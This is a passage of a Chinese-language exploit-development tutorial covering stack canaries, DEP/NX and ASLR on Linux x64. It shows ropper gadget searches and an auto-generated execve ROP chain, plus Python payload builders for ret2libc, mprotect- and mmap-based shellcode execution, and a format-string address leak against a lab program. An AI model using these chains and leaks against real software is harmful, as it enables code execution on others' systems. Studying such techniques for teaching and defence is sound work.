- 可覆盖的 Canary/Cookie：例如，在 Windows 中，此值位于 PE 映像内存的某个位置。如果我们能够写入内存中的任何内容，就可以将其更改为我们已知的值。例如，此mov qword ptr[RegisterA], RegisterB指令将数据从寄存器 B 复制到寄存器 A 引用的内存中。如果我们能够控制这些寄存器，就可以替换原始的 Canary。  
  
DEP / NX == 不再直接执行代码  
  
在本文和之前的文章中，我们一直依赖于通过将恶意代码注入堆栈并强制程序执行来劫持程序执行流。此保护措施旨在防止这种情况发生。如果漏洞利用绕过金丝雀检测并控制指令指针，则注入的代码将无法执行。一旦处理器开始从堆栈执行这些指令，它将触发中断，通知操作系统发生了异常。系统将引发访问冲突异常，然后终止进程。  
  
DEP 代表数据执行保护，它主要以两种模式工作：  
1. 硬件级别支持：针对可以将内存页面标记为不可执行（NX 位）的 CPU 的硬件强制 DEP。在此模式下，处理器本身可以阻止执行任何来自内存页面的不应执行的代码。  
  
1. 软件级别支持：对于没有硬件支持的 CPU，软件强制 DEP 是一种替代方案。在此模式下，操作系统会自行干预以实施此层保护。  
  
此功能通过启动配置进行设置，其中您的 DEP 应用程序根据启动配置数据中的 No-eXecute (NX) 页面保护策略设置为在系统启动时启动。并且，根据策略设置，特定应用程序可能会更改此进程的 DEP 设置。此外，还有多种模式：  
  
选择加入：DEP 仅对核心系统映像以及 DEP 配置中指定的映像启用。仅为操作系统组件（包括 Windows 内核和驱动程序）启用 DEP。此外，还为管理员预先选择的程序启用 DEP。  
1. 选择退出：除例外列表中的程序和服务外，所有程序和服务均启用 DEP。如果某个程序不在例外列表中，则该程序将启用 DEP。  
  
1. AlwaysOn：在此模式下，所有进程都启用 DEP，无任何例外，并且无法在运行时关闭。  
  
1. AlwaysOff ：此模式与AlwaysOn相反，因为所有进程的 DEP 都被禁用，并且无法在运行时打开。  
  
每个可执行二进制文件都包含每个部分及其所需权限的信息，例如读取、写入和执行权限。例如，在 Windows PE 文件中，_IMAGE_SECTION_HEADER.Characteristics表示某个部分在内存中所需的权限。如果IMAGE_SCN_MEM_EXECUTE设置了该标志，则操作系统将被强制禁用这些内存页的“不可执行”位。对于 ELF 文件也是如此，其中ElfN_Shdr.sh_flags表示每个部分所需的权限。如果SHF_EXECINSTR设置了该标志，则该部分中的数据是可执行的。  
  
当我们构建代码时，编译器和链接器会为每个段分配加载到内存时所需的权限。因此，我们使用该-zexecstack选项强制编译器将堆栈及其包含的数据标记为可执行文件。当操作系统将二进制文件加载到内存中时，它会将堆栈内存页标记为可执行空间。但是，默认情况下，堆栈的权限是读写，而不是执行。  
  

```
┌──(user㉿host)-[~]
└─$ ropper
(ropper)> file /usr/lib/x86_64-linux-gnu/libc.so.6
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] File loaded.
(libc.so.6/ELF/x86_64)>
```

  
  
file我们将运行该工具并使用所示的命令加载可执行文件。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taeYk9pbibPZ7GcMFkubQZibXrL0wDprd8tOsSXibKxZargKwpYxMudDSzjJuoVwJL9KiaBzsJiaklMibgPg/640?wx_fmt=png&from=appmsg "")  
  
我们可以使用以下命令提取该文件中的所有 ROP 小工具gadget，如上图所示。我们还可以使用“search”命令轻松搜索特定的小工具：  
  

```
(libc.so.6/ELF/x86_64)> search pop rdi
[INFO] Searching for gadgets: pop rdi

[INFO] File: /usr/lib/x86_64-linux-gnu/libc.so.6
0x0000000000059c05: pop rdi; adc eax, 0xe762e800; std; jmp qword ptr [rsi - 0x70]; 
0x000000000017cd88: pop rdi; add ah, byte ptr [rdx - 0x4e]; and byte ptr [rdi], ah; ret; 
0x0000000000179ec8: pop rdi; add ah, byte ptr [rdx - 0x4e]; and byte ptr [rsi], ah; ret; 
0x00000000000d7a01: pop rdi; add byte ptr [rax], al; add byte ptr [rdi + rcx + 0x45], al; fsubr st(1); ret 0xfff0; 
0x000000000011e7a2: pop rdi; add ebx, ebp; lahf; xor eax, eax; ret; 
0x000000000016b267: pop rdi; add rax, rdi; shr rax, 2; vzeroupper; ret; 
0x0000000000165b47: pop rdi; add rax, rdi; vzeroupper; ret; 
0x000000000016c935: pop rdi; add rdi, 0x21; add rax, rdi; vzeroupper; ret; 
0x000000000011072d: pop rdi; call rax; 
0x000000000011072d: pop rdi; call rax; mov rdi, rax; mov eax, 0x3c; syscall; 
0x00000000000f43ad: pop rdi; cmp eax, 0x8948fff3; ret 0x448b; 
0x000000000016a927: pop rdi; cmp esi, dword ptr [rdi + rax]; jne 0x16a934; add rax, rdi; vzeroupper; ret; 
0x00000000001671db: pop rdi; cmp sil, byte ptr [rdi + rax]; jne 0x1671e9; add rax, rdi; vzeroupper; ret; 
0x000000000002d13c: pop rdi; jmp rax; 
0x0000000000054968: pop rdi; mov dword ptr [rdi], 0; mov eax, 2; ret; 
0x00000000000f9a10: pop rdi; mov eax, 0x3a; syscall; 
0x0000000000100a1a: pop rdi; or al, ch; iretd; jns 0x100a12; jmp qword ptr [rsi - 0x7d]; 
0x0000000000100b60: pop rdi; or byte ptr [rax - 0x77], cl; pop rbp; add al, ch; test dword ptr [rax - 0xe], edi; jmp qword ptr [rsi - 0x7d]; 
0x0000000000110e0c: pop rdi; or eax, 0x64d8f700; mov dword ptr [rdx], eax; mov eax, 0xffffffff; ret; 
0x00000000001420d2: pop rdi; out dx, al; dec dword ptr [rax - 0x77]; ret 0x8548; 
0x000000000002a3fc: pop rdi; pop rbp; ret; 
0x000000000015e700: pop rdi; cli; dec dword ptr [rax - 0x39]; ret 0xffff; 
0x000000000002a205: pop rdi; ret;
```

  
  
该工具已收集与我们要查找的指令相关的所有小工具（pop rdi）。我们还可以使搜索范围更加广泛。  
  

```
(libc.so.6/ELF/x86_64)> search mov [rbx + 0x40],%
[INFO] Searching for gadgets: mov [rbx + 0x40],%

[INFO] File: /usr/lib/x86_64-linux-gnu/libc.so.6
0x00000000000a3bcf: mov dword ptr [rbx + 0x40], eax; and byte ptr [rbx + 0x50], 0xfe; mov qword ptr [rbx], rdi; mov dword ptr [rbx + 0x30], eax; call rcx; 
0x00000000001161f5: mov dword ptr [rbx + 0x40], eax; mov eax, 1; add rsp, 8; pop rbx; pop rbp; ret; 
0x000000000003fa47: mov dword ptr [rbx + 0x40], esi; pop rbx; ret; 
0x000000000003fa28: mov dword ptr [rbx + 0x40], esi; xor eax, eax; pop rbx; ret; 
0x000000000008ba03: mov dword ptr [rbx + 0x40], esp; mov dword ptr [rbx], eax; pop rbx; pop rbp; pop r12; ret; 
0x000000000008be8e: mov dword ptr [rbx + 0x40], esp; pop rbx; pop rbp; pop r12; ret; 
0x000000000008ba02: mov qword ptr [rbx + 0x40], r12; mov dword ptr [rbx], eax; pop rbx; pop rbp; pop r12; ret; 
0x000000000008be8d: mov qword ptr [rbx + 0x40], r12; pop rbx; pop rbp; pop r12; ret; 
0x00000000000a3bce: mov qword ptr [rbx + 0x40], r8; and byte ptr [rbx + 0x50], 0xfe; mov qword ptr [rbx], rdi; mov dword ptr [rbx + 0x30], eax; call rcx; 
0x00000000001161f4: mov qword ptr [rbx + 0x40], rax; mov eax, 1; add rsp, 8; pop rbx; pop rbp; ret;
```

  
  
如您所见，我们让该工具搜索任何由寄存器指向的内存移动指令rbx+40，而不管操作数是什么。这非常有用，因为并非所有情况下，我们都能找到能够完全按照我们期望执行的操作。另一种方法是间接使用不同的指令来实现相同的结果。该工具还提供了一个很棒的功能，可以为我们构建完全可用的 ROP 链。  
  

```
(libc.so.6/ELF/x86_64)> ropchain execve cmd=id

[INFO] ROPchain Generator for syscall execve:


[INFO] 
write command into data section
rax 0xb
rdi address to cmd
rsi address to null
rdx address to null


[INFO] Try to create chain which fills registers without delete content of previous filled registers
[*] Try permuation 1 / 24
[INFO] 

[INFO] Look for syscall gadget

[INFO] syscall gadget found
[INFO] generating rop chain
#!/usr/bin/env python
# Generated by ropper ropchain generator #
fromstruct import pack

p = lambda x : pack('Q', x)

IMAGE_BASE_0 = 0x0000000000000000# 2f1f84e0f4df64e0eb1829fabd8720136456dc4efce9962cb1188f8d436e30b0
rebase_0 = lambda x : p(x + IMAGE_BASE_0)

rop = ''

rop += rebase_0(0x000000000003c714) # 0x000000000003c714: pop r13; ret; 
rop += '//////id'
rop += rebase_0(0x000000000002aa5f) # 0x000000000002aa5f: pop rbx; ret; 
rop += rebase_0(0x00000000001e7000)
rop += rebase_0(0x000000000005e961) # 0x000000000005e961: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += rebase_0(0x000000000003c714) # 0x000000000003c714: pop r13; ret; 
rop += p(0x0000000000000000)
rop += rebase_0(0x000000000002aa5f) # 0x000000000002aa5f: pop rbx; ret; 
rop += rebase_0(0x00000000001e7008)
rop += rebase_0(0x000000000005e961) # 0x000000000005e961: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += rebase_0(0x000000000002a205) # 0x000000000002a205: pop rdi; ret; 
rop += rebase_0(0x00000000001e7000)
rop += rebase_0(0x000000000002bb39) # 0x000000000002bb39: pop rsi; ret; 
rop += rebase_0(0x00000000001e7008)
rop += rebase_0(0x000000000010d37d) # 0x000000000010d37d: pop rdx; ret; 
rop += rebase_0(0x00000000001e7008)
rop += rebase_0(0x0000000000043067) # 0x0000000000043067: pop rax; ret; 
rop += p(0x000000000000003b)
rop += rebase_0(0x000000000008ed72) # 0x000000000008ed72: syscall; ret; 
print(rop)
[INFO] rop chain generated!
```

  
  
如您所见，该工具为我们创建了完整的 ROP 链，以便我们执行系统调用 ( execve("id"))。我们需要做的就是在运行时将变量设置IMAGE_BASE_0为 libc 的基址。遗憾的是，这非常有限，该工具无法为我们需要的所有内容创建 ROP 链，而且由于不同程序和不同 bug 的情况各不相同，因此它也不是完全可靠的。  
  
返回 Libc（ret2libc）  
  
让我们练习一下本博客中介绍的第一个示例，这次我们不会使用该-zexecstack选项来编译它。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taeYk9pbibPZ7GcMFkubQZibXrCPVibPM7rvwsfFJG94IEuWJ4mxIueZ5gMiccUzkBGShXue5PCzMIN0wA/640?wx_fmt=png&from=appmsg "")  
  
请注意，第一次使用该-zexecstack选项进行编译时，利用成功，并且 shellcode 成功执行，但第二次，当我们没有使用该选项时，利用失败，并且 shellcode 没有执行。  
  
我们需要更改代码执行策略，不再让程序跳转执行注入到堆栈中的代码，而是让它返回到 libc 并运行系统函数，这样我们就可以在系统上运行命令了。系统函数只接受一个参数，即以空字符结尾的字符串形式的命令。根据 Linux 调用约定，任何函数调用的第一个参数都应该通过 rdi 寄存器传递，因此我们需要一个 ROP 小工具将命令地址设置为 rdi，并且一旦这个小工具返回，保存的指令指针应该是另一个调用系统函数的小工具。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taeYk9pbibPZ7GcMFkubQZibXreHdibzibNm1tbzGtW8YwniaJwCicnEMib1OhE2tIwhVGba2NmNMyfQJR45w/640?wx_fmt=png&from=appmsg "")  
  
太好了。使用Peda searchmem命令，我们在 C 库中找到了字符串“id”，我们将使用它作为系统函数的参数。  
  

```
gdb-peda$ x/s 0x7ffff7f5a078
0x7ffff7f5a078: &#34;id&#34;
```

  
  
好的，现在我们需要一个 ROP 小工具来将此指针设置为 RDI 寄存器。典型的 ROP 小工具是pop rdi; ret，因此我们将用该小工具的地址替换指令指针，并将命令地址放在它旁边。现在，我们准备调用系统函数。我们将遵循相同的方法：我们将系统函数放在堆栈上并使用小pop rax; ret工具来检索它，然后我们将使用call rax小工具。但是随后进程将崩溃，因为一旦系统函数完成并返回，下一个指令指针将是一个不受我们控制的地址。因此，我们必须随后调用退出函数以正确关闭程序。幸运的是，我找到了一个调用寄存器（call rax）然后调用退出函数的小工具，而我们不必自己执行此操作。  
  

```
(gdb) x/3i0x7ffff7dd7d66 
   0x7ffff7dd7d66 <__libc_start_call_main+118>: call *%rax
   0x7ffff7dd7d68 <__libc_start_call_main+120>: mov %eax,%edi
   0x7ffff7dd7d6a <__libc_start_call_main+122>: call 0x7ffff7df0280 <__GI_exit>
(gdb)
```

  
  
我们构建 ROP 链如下：  
  

```
def hijack_exec(p: Popen, canary):
    payload = b&#34;&#34;
    payload += b&#34;A&#34; * 0x112                               # Fills the stack frame
    payload += struct.pack( &#34;<Q&#34;, canary ) # Places the correct canary value 
    payload += b&#34;B&#34; * 0x8                                 # Base pointer
    payload += struct.pack( &#34;<Q&#34;, 0x7ffff7dd8205 ) # pop rdi; ret
    payload += struct.pack( &#34;<Q&#34;, 0x7ffff7f5a078 ) # The command address ( id )
    payload += struct.pack( &#34;<Q&#34;, 0x7ffff7df1067 ) # pop rax; ret
    payload += struct.pack( &#34;<Q&#34;, 0x7ffff7e008f0 ) # system function address
    payload += struct.pack( &#34;<Q&#34;, 0x7ffff7dd7d66 ) # call rax ; system( &#34;id&#34; ); exit( 0 )

    p.stdin.write( b&#34;1\n&#34; )
    p.stdin.write( payload + b&#34;\n&#34; )
    p.stdin.flush()
```

  
  
让我们针对该程序尝试这个策略，看看它是否有效。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taeYk9pbibPZ7GcMFkubQZibXrS4NvAdzvoT9tbdqWHcViaaaIEEVnOomTL1ecGtFVMKmYffue090gBmg/640?wx_fmt=png&from=appmsg "")  
  
强制禁用 DEP 保护并执行任意代码  
  
操作系统提供了一些低级 API，允许我们在运行时修改内存页面的权限。例如，Windows 提供了一个名为的 API VirtualProtect，以及一个更低级的原生 API 来实现NtProtectVirtualMemory这一点。另一方面，基于 Unix 的系统也提供了类似的 API 来完成相同的任务，例如mprotect。这些事实可能会被滥用，迫使目标程序执行我们的恶意指令。  
  
我们可以滥用该mprotect函数使堆栈可执行，然后强制程序执行注入到堆栈中的指令。mprotect声明如下：  
  

```
intmprotect(void addr[.size], size_t size, int prot);
```

  
  
它需要三个参数：  
1. addr：内存区域的起始地址，必须与页边界对齐。  
  
1. size：地址范围的长度（以字节为单位）。  
  
1. prot：所需的访问保护。例如PROT_READ、PROT_WRITE和PROT_EXECUTE。  
  
根据 Linux x64 调用约定，这三个参数必须通过 RDI、RSI 和 RDX 寄存器传递。我们需要构建一个执行以下操作的 ROP 链：  
1. 将与页面边界对齐的堆栈地址设置为 RDI，这可以通过将该地址写入堆栈并通过弹出小工具（pop rdi; ret）检索它来完成。  
  
1. 通过将 RSI 写入堆栈并通过弹出小工具 ( pop rsi; ret) 检索它来设置所需的大小。  
  
1. 通过将 RDX 写入堆栈并通过弹出小工具 ( pop rdx; ret) 检索它来设置所需的保护。  
  
1. 将的直接地址放在mprotect堆栈上作为返回地址，以便程序可以直接跳转到执行它。  
  
1. 将 shellcode 地址放在地址旁边，mprotect以便 API 返回后立即执行。  
  

```
def hijack_exec(p: Popen, canary):
    shellcode = 0x7fffffffddb0 + 0x40                     # Shellcode Address
    stack_page = shellcode & 0xfffffffffffff000           # Aligne the address to the page boundary.
    payload = b&#34;&#34;
    payload += b&#34;A&#34; * 0x112                               # Fills the stack frame
    payload += struct.pack( &#34;<Q&#34;, canary ) # Places the correct canary value 
    payload += b&#34;B&#34; * 0x8                                 # Base pointer
    payload += struct.pack( &#34;<Q&#34;, 0x7ffff7dd8205 ) # pop rdi; ret
    payload += struct.pack( &#34;<Q&#34;, stack_page ) # The aligned stack page address
    payload += struct.pack( &#34;<Q&#34;, 0x7ffff7dd9b39 ) # pop rsi; ret
    payload += struct.pack( &#34;<Q&#34;, 0x1000 ) # Page size 
    payload += struct.pack( &#34;<Q&#34;, 0x7ffff7ebb37d ) # pop rdx; ret
    payload += struct.pack( &#34;<Q&#34;, 0x01 | 0x02 | 0x04 ) # Protections: PROT_EXEC=0x01, PROT_WRITE=0x02, PROT_READ=0x04 
    payload += struct.pack( &#34;<Q&#34;, 0x7ffff7ebb200 ) # mprotect function address
    payload += struct.pack( &#34;<Q&#34;, shellcode ) # Jump into shellcode
    payload += b&#34;\x90&#34; * 0x40                             # NOPs for padding
    payload += buf # Shellcode

    p.stdin.write( b&#34;1\n&#34; )
    p.stdin.write( payload + b&#34;\n&#34; )
    p.stdin.flush()
```

  
  
让我们运行这个利用策略并看看会发生什么。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taeYk9pbibPZ7GcMFkubQZibXriaCiaQnIeZSVIk4MhCEzcyQemq751nENzIkmBrvaBtEXo9ITEodZsLicA/640?wx_fmt=png&from=appmsg "")  
  
或者，在 Windows 中，可以使用类似NTSetInformationProcess和的函数SetProcessDEPPolicy来禁用此类保护，并根据配置的 DEP 模式使内存可执行。在基于 Unix 的系统中，有一些类似的方法，我们可以使用一个称为 的低级 API ，personality并将标志作为参数传递READ_IMPLIES_EXEC给它，这将使稍后映射的内存即使尚未使用执行权限进行映射（这在先前创建的堆上不起作用）。  
  
一种有效的方法是映射具有执行权限的新内存，然后将恶意指令移动到该内存，并重定向程序的执行流以执行这些指令。在 Windows 中，有几个低级 API 可以帮助实现此目的，例如VirtualAlloc、NtAllocateVirtualMemory、WriteProcessMemory和NtWriteVirtualMemory。另一方面，基于 Unix 的系统也有一些函数可以执行相同的操作，例如mmap。让我们按照这种方法来开发我们自己的漏洞利用程序。  
  
我们需要构建一个ROP链来完成以下工作：  
  

```
pExecutableMemory = mmap( NULL, 0x1000, PROT_EXEC|PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_SHARED, -1, 0 );
memcpy( pExecutableMemory, pShellcode, ulShellSize );
pExecutableMemory(); // jmp/call pExecutableMemory
```

  
  
声明mmap内容如下：  
  

```
void *mmap(void addr[.length], size_t length, int prot, int flags, int fd, off_t offset);
```

  
  
它采用以下参数：  
1. addr：新映射的起始地址在 addr 中指定或为 NULL。  
  
1. length：映射的长度。  
  
1. prot：所需的访问保护。例如PROT_READ、PROT_WRITE和PROT_EXECUTE。  
  
1. flags：这决定了映射的更新是否对映射同一区域的其他进程可见，以及更新是否传递到底层文件。  
  
1. fd：文件描述符（MAP_ANONYMOUS使用标志时此参数将被忽略）。  
  
1. offset：fd 中映射内存的偏移量（使用该MAP_ANONYMOUS标志时，此参数必须为零）。  
  
提醒：根据 x64 Linux 调用约定，六个参数必须按照以下顺序通过寄存器传递给函数：rdi、rsi、rdx、rcx、r8、r9。因此，为了调用该 API，我们需要构建一个执行以下操作的 ROP 链：  
1. 我们必须将 rdi 设置为 NULL。我找不到任何“neither”和“ mov rdi, 0; retnor xor rdi, rdi; ret”指令，所以替代方案是pop rdi; ret，在指令之后的堆栈中立即填充零（\x00 没有任何问题，因为对于存在漏洞的程序来说，它不是一个坏字节）。  
  
1. rsi 寄存器必须设置为适当的大小，例如 0x1000（内存页大小）。这个小工具pop rsi; ret很方便。  
  
1. 必须将 rdx 寄存器设置为所需的保护（PROT_EXEC|PROT_READ|PROT_WRITE），我们将使用pop rdx; ret它。  
  
1. 必须将 rcx 寄存器设置为所需的标志 (MAP_ANONYMOUS|MAP_SHARED)，我们将使用pop rcx; add eax, 0x1734ba; ret它来实现。这个小工具会更改 eax 的值，但我们现在不关心 eax 寄存器，所以没问题。  
  
1. 寄存器 r8 需要设置为 -1，而 -1 正好是 0xffffffffffffff，因此我们将其写入堆栈并使用pop r8; ret小工具检索它。  
  
1. 最后一个参数是零，因此寄存器 r9 应该设置为零，但此时它已经为零，所以我们不必对它做任何事情。  
  
1. 必须将该地址mmap设置为返回地址，以便在设置所有参数后执行系统调用。  
  
下一步是将我们的恶意代码复制到使用mmap该memcpy函数分配的内存中。该memcpy函数声明如下：  
  

```
void *memcpy(void dest[restrict .n], constvoid src[restrict .n], size_t n);
```

  
  
它需要三个参数：  
1. dest：要复制到的目标内存地址。  
  
1. src：复制的源内存地址。  
  
1. n：要复制的字节数。  
  
为此，我们必须完成我们的 ROP 链，如下所示：  
1. rdi 寄存器需要设置为mmaprax 寄存器返回的映射内存地址。遗憾的是，我找不到合适的工具，比如mov rdi, rax; ret或push rax; pop rdi; ret，将 rax 的值移动到 rdi ，不过谢天谢地，我找到了一个可以交换 rax 和 rdi 的值的工具xchg rdi, rax; cld; ret;。  
  
1. rsi 寄存器需要设置为堆栈中的 shellcode 地址，因此小工具pop rsi; ret总是可以发挥作用。  
  
1. rdx 需要设置为 shellcode 大小，和之前一样，我们将使用pop rdx; ret。  
  
1. 必须将该地址memcpy设置为返回地址以便执行。  
  
现在一切就绪，我们只需跳转到可执行内存中，运行我们的shellcode即可。此时，rdi寄存器保存的是可执行内存地址（shellcode），因此我们需要一个类似jmp rdi或call rdi（shellcode会终止进程，因此我们无需关心是否丢失流控制）的小工具。但我找到了一个替代的小工具，即push rdi; adc al, 0x48; lea eax, [rdi + 0x15]; ret;，该小工具将可执行shellcode地址压入堆栈，将进位标志+0x48添加到al，然后将rdi值+0x15加载到eax（有效且方便）。一旦该小工具返回，下一个返回地址将是shellcode，这是根据push指令执行的。  
  

```
def hijack_exec(p: Popen, canary):
    shellcode = 0x7fffffffddb0  + 0x40                    # Shellcode Address

    payload = b&#34;&#34;
    payload += b&#34;A&#34; * 0x112                               # Fills the stack frame
    payload += struct.pack( &#34;<Q&#34;, canary ) # Places the correct canary value 
    payload += b&#34;B&#34; * 0x8                                 # Base pointer
    payload += struct.pack( &#34;<Q&#34;, 0x7ffff7dd8205 ) # pop rdi; ret
    payload += b&#34;\x00&#34; * 0x8                              # addr = NULL
    payload += struct.pack( &#34;<Q&#34;, 0x7ffff7dd9b39 ) # pop rsi; ret
    payload += struct.pack( &#34;<Q&#34;, 0x1000 ) # Page size 
    payload += struct.pack( &#34;<Q&#34;, 0x7ffff7ebb37d ) # pop rdx; ret
    payload += struct.pack( &#34;<Q&#34;, 0x01 | 0x02 | 0x04 ) # Protections: PROT_EXEC=0x01, PROT_WRITE=0x02, PROT_READ=0x04 
    payload += struct.pack( &#34;<Q&#34;, 0x7ffff7ded94c ) # pop rcx; add eax, 0x1734ba; ret;
    payload += struct.pack( &#34;<Q&#34;, 0x01 | 0x20 ) # flags: MAP_SHARED=0x01 MAP_ANONYMOUS=0x20
    payload += struct.pack( &#34;<Q&#34;, 0x7ffff7fd9efb ) # pop r8; ret
    payload += b&#34;\xff&#34; * 0x8                              # fd = -1
    payload += struct.pack( &#34;<Q&#34;, 0x7ffff7eba9a0 ) # mmap( NULL, 0x1000, PROT_EXEC|PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_SHARED, -1, 0 )
    
    payload += struct.pack( &#34;<Q&#34;, 0x7ffff7f288a1 ) # xchg rdi, rax; cld; ret;
    payload += struct.pack( &#34;<Q&#34;, 0x7ffff7dd9b39 ) # pop rsi; ret
    payload += struct.pack( &#34;<Q&#34;, shellcode ) # Shellcode address
    payload += struct.pack( &#34;<Q&#34;, 0x7ffff7ebb37d ) # pop rdx; ret
    payload += struct.pack( &#34;<Q&#34;, len(buf) + 0x40 ) # Shellcode size for memcpy
    payload += struct.pack( &#34;<Q&#34;, 0x7ffff7feb6e0 ) # memcpy( exec_mem, shellcode, shellsize )

    # Execute the shellcode
    payload += struct.pack( &#34;<Q&#34;, 0x7ffff7e5ce42 ) # push rdi; adc al, 0x48; lea eax, [rdi + 0x15]; ret;
    
    payload += b&#34;\x90&#34; * 0x40                             # NOPs for padding
    payload += buf # Shellcode

    p.stdin.write( b&#34;1\n&#34; )
    p.stdin.write( payload + b&#34;\n&#34; )
    p.stdin.flush()
```

  
  
让我们开火吧：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taeYk9pbibPZ7GcMFkubQZibXrMXwKgdx1Pm8N7f8uo5FCfPvQ1hS1rCoc2AhnnOqgdJ6j4KYwibEd5yg/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taeYk9pbibPZ7GcMFkubQZibXrd9Eg3cntH3uoGM4Ve65LauQP3BeiaaTDvwLiaibVXyLMPBxLNicCJUdUWg/640?wx_fmt=png&from=appmsg "")  
  
地址空间布局随机化（ASLR）  
  
我们使用的大多数漏洞利用策略都需要使用固定地址，例如堆栈中的 Shellcode 地址、关键数据地址（例如 Canary 漏洞）以及 ROP 小工具地址。如果不知道这些关键数据的地址，漏洞利用将完全失败。本保护措施旨在杜绝这种做法。  
  
ASLR 本质上是在程序加载到内存时随机化可执行文件的基址，同时也随机化加载的库、堆栈和堆。因此，如果攻击者控制了执行流程（例如控制指令指针），那么待执行代码的位置、ROP 工具的地址以及漏洞利用所需的所有其他信息都将完全未知。要理解这种保护措施的具体工作原理，我们首先需要了解操作系统如何管理内存及其背后的考量。实际上，我们在调试过程中看到的以及与之交互的地址并非实际的物理内存地址，而是虚拟内存地址。我将解释操作系统为何采用这种方式工作以及其优势所在。  
  
在当今时代，与需要同时运行众多程序的用户，甚至服务于数千甚至数百万客户端的服务器的需求相比，物理内存空间极其有限。所有这些都完全不适合 RAM 大小。此外，RAM 非常昂贵，不仅在经济上，还会因为增加 RAM 会对能耗和计算机整体性能等其他方面产生负面影响。因此，虚拟内存应运而生，解决了这些问题。  
  
虚拟内存可以定义为操作系统的一种内存管理方法，它模拟一个大于物理内存的内存。它允许许多大于物理内存的程序以非常智能的方式运行，允许将部分数据加载到物理内存中，而不是全部数据。硬盘用于存储未使用的数据。当轮到数据时，内存管理器会将其交换到物理内存中。为了跟踪数据及其在物理内存中的实际位置，内存管理器会构建一个映射表，用于标识数据的虚拟地址及其在物理内存中的对应地址，以及其他标识哪些虚拟地址属于哪个进程的信息。您是否注意到，在同时运行的不同进程中，相同的地址会重复出现？  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rWGOWg48taeYk9pbibPZ7GcMFkubQZibXrVdBhRxSaG9duzuynvIzVpJibichN4yYlSZUAjqF4u1bjiaQEBO1QFKuVg/640?wx_fmt=jpeg&from=appmsg "")  
  
操作系统概念书第 9 章  
  
映射表（页表）起着至关重要的作用，当特定进程请求访问虚拟地址时，它帮助操作系统将虚拟地址转换为真实的物理地址。操作系统与 CPU 中的内存管理单元 (MMU) 协同执行此任务。这就是为什么当不同的进程尝试访问相同的虚拟地址时不会发生冲突的原因。  
  
通常，当 ASLR 被禁用时，操作系统会将进程映射到固定的虚拟内存范围。但是，当 ASLR 被启用时，操作系统会在每次程序运行时选择随机范围。页表会始终帮助内存管理器将这些虚拟地址转换为物理地址；它并不关心这些地址；对它来说，这些地址只是数字而已。我想在此指出，无论是否启用 ASLR，物理内存中的数据地址本质上都是随机的，并且每次程序运行时，数据地址都会位于不同的位置。整个问题都在于虚拟内存管理系统。  
  
击败ASLR  
  
是的，这种保护措施确实让攻击变得更加困难，也使漏洞利用更加复杂，尤其是在与上述其他保护措施结合使用时。然而，我们仍然可以采取很多措施来绕过这种保护措施。一种策略是利用任何内存泄露漏洞或其他技术泄露所需的地址，这样我们就可以绕过随机化机制并绕过保护措施。为了构建我们的 ROP 链，我们只需要一个属于模块/库的地址。通过这个地址，我们可以计算出模块的基址以及所有所需的 ROP 小工具。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48taeYk9pbibPZ7GcMFkubQZibXr3wd6036wIJZhFqU8Sd9TjXyvrlLHROxl0ErLIiacN8sRDBpgzJkaNOw/640?wx_fmt=png&from=appmsg "")  
  
如图所示，堆栈中有一些相对于 Libc 的地址，也有一些相对于堆栈的地址。我们需要泄露这些地址，以便动态计算所需的重要 ROP Gadget 的地址以及 Shellcode 的地址。因此，我们需要更新函数leak_canary以泄露这些所需的地址，并将其重命名为合适的名称，例如leak_stuff。  
  

```
def leak_stuff(p: Popen):
    p.stdin.write( b&#34;1\n&#34; + b&#34;%49$p %51$p %67$p\n&#34; + b&#34;2\n&#34;)
    p.stdin.flush()
    out= b&#34;&#34;
    pos = -1
    n = 0
    
    while n < 1024:
        out = p.stdout.readline()
        pos = out.find( b&#34;0x&#34; )
        ifbool( ~pos ):
            break

        n += 1

    else:
        return [ -1 ] * 3

    info = []
    n = 3

    whilebool( n ):
        out= out[pos:]
        end = out.find( b&#34; &#34; )
        info += [ int(out[:end], 16) ]
        pos = ( end + 1 )
        n -= 1

    return info
```

  
  
泄露这些地址后，我们需要修改该hijack_exec函数，将 C 库基址和 Shellcode 地址作为参数传入。但首先，我们需要根据这些泄露的地址计算出我们需要的信息。  
  

```
(gdb) p/x 0x7ffff7dd7d68-0x00007ffff7dae000
$1 = 0x29d68
```

  
  
将泄漏的地址（相对于 Libc）减去库的基地址，我们得到这个结果。因此，我们必须从这个结果中减去泄漏的地址，才能得到库的基地址。  
  

```
(gdb) p/x 0x7fffffffde98-(0x7fffffffddb0+0x40)
$2 = 0xa8
```

  
  
将泄漏的相对于堆栈的地址从shellcode地址中减去，可以得到这个结果。因此，我们必须从这个结果中减去泄漏的地址，才能得到shellcode的地址。  
  

```
def hijack_exec(p: Popen, canary, libc_base, shellcode):
    stack_page = shellcode & 0xfffffffffffff000           # Aligne the address to the page boundary.
    payload = b&#34;&#34;
    payload += b&#34;A&#34; * 0x106                               # Fills the stack frame
    payload += struct.pack( &#34;<Q&#34;, canary ) # Places the correct canary value 
    payload += b&#34;B&#34; * 0x8                                 # Base pointer
    payload += struct.pack( &#34;<Q&#34;, libc_base + 0x2a205 ) # pop rdi; ret
    payload += struct.pack( &#34;<Q&#34;, stack_page ) # The aligned stack page address
